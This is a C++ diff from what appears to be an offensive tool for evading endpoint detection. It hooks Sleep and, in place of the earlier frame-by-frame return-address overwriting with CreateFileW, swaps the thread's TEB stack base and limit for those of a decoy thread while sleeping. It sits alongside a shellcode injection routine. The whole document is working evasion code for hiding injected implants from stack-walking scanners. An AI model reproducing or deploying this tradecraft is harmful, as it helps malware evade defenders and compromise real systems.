@@ -1,5 +1,6 @@
 
 #include "header.h"
+#include <intrin.h>
 
 HookedSleep g_hookedSleep;
 StackTraceSpoofingMetadata g_stackTraceSpoofing;
@@ -10,15 +11,30 @@ void WINAPI MySleep(DWORD _dwMilliseconds)
     const volatile DWORD dwMilliseconds = _dwMilliseconds;
 
     // Perform this (current) thread call stack spoofing.
-    spoofCallStack(true);
+    //spoofCallStack(true);
 
     log("\n===> MySleep(", std::dec, dwMilliseconds, ")\n");
 
+    PULONG_PTR ptr = (PULONG_PTR)_AddressOfReturnAddress();
+    ptr--;
+
+
+    Start_Of_TEB* teb = (Start_Of_TEB*)NtCurrentTeb();
+    g_stackTraceSpoofing.origTebBaseLow = (ULONG_PTR)teb->StackBase;
+    g_stackTraceSpoofing.origTebBaseHigh = (ULONG_PTR)teb->StackLimit;
+
+    teb->StackBase = (void*)g_stackTraceSpoofing.legitTebBaseLow;
+    teb->StackLimit = (void*)g_stackTraceSpoofing.legitTebBaseHigh;
+
     // Perform sleep emulating originally hooked functionality.
     ::SleepEx(dwMilliseconds, false);
+
+
+    teb->StackBase = (void*)g_stackTraceSpoofing.origTebBaseLow;
+    teb->StackLimit = (void*)g_stackTraceSpoofing.origTebBaseHigh;
  
     // Restore original thread's call stack.
-    spoofCallStack(false);
+    //spoofCallStack(false);
 }
 
 bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers /*= NULL*/)
@@ -267,23 +283,14 @@ void spoofCallStack(bool overwriteOrRestore)
     {
         for (size_t i = 0; i < numOfFrames; i++)
         {
-            if (i > g_stackTraceSpoofing.mimickedFrames)
-            {
-                CallStackFrame frame = { 0 };
-                g_stackTraceSpoofing.spoofedFrame[g_stackTraceSpoofing.spoofedFrames++] = frame;
-                break;
-            }
-
             auto& frame = frames[i];
-            auto& mimicframe = g_stackTraceSpoofing.mimicFrame[i];
 
             if (g_stackTraceSpoofing.spoofedFrames < MaxStackFramesToSpoof)
             {
                 //
                 // We will use CreateFileW as a fake return address to place onto the thread's frame on stack.
                 //
-                //frame.overwriteWhat = (ULONG_PTR)::CreateFileW;
-                frame.overwriteWhat = (ULONG_PTR)mimicframe.retAddr;
+                frame.overwriteWhat = (ULONG_PTR)::CreateFileW;
 
                 //
                 // We're saving original frame to later use it for call stack restoration.
@@ -454,17 +461,15 @@ bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr &thread)
     return (NULL != thread.get());
 }
 
-/*
-void _acquireLegitimateThreadStack(LPVOID param)
+
+void WINAPI _acquireLegitimateThreadStack(LPVOID param)
 {
-    ULONG_PTR lowLimit = 0, highLimit = 0;
-    ULONG stackSize = highLimit - lowLimit;
-    GetCurrentThreadStackLimits(&lowLimit, &highLimit);
-    
-    g_stackTraceSpoofing.legitimateStackContents.resize(stackSize, 0);
-    memcpy(g_stackTraceSpoofing.legitimateStackContents.data(), (const void*)lowLimit, stackSize);
+    Start_Of_TEB* teb = (Start_Of_TEB*)NtCurrentTeb();
+    g_stackTraceSpoofing.legitTebBaseLow = (ULONG_PTR)teb->StackBase;
+    g_stackTraceSpoofing.legitTebBaseHigh = (ULONG_PTR)teb->StackLimit;
+
+    ::SleepEx(INFINITE, false);
 }
-*/
 
 bool acquireLegitimateThreadStack()
 {
@@ -474,7 +479,8 @@ bool acquireLegitimateThreadStack()
     HandlePtr secondThread(::CreateThread(
         NULL,
         0,
-        (LPTHREAD_START_ROUTINE)::Sleep,
+        //(LPTHREAD_START_ROUTINE)::Sleep,
+        (LPTHREAD_START_ROUTINE)_acquireLegitimateThreadStack,
         (LPVOID)INFINITE,
         0,
         0
@@ -482,11 +488,8 @@ bool acquireLegitimateThreadStack()
 
     Sleep(1000);
 
-    walkCallStack(secondThread.get(), g_stackTraceSpoofing.mimicFrame, _countof(g_stackTraceSpoofing.mimicFrame), &g_stackTraceSpoofing.mimickedFrames, false, 0);
-
-    return g_stackTraceSpoofing.mimickedFrames > 0;
+    return true;
 }
-
 
 int main(int argc, char** argv)
 {
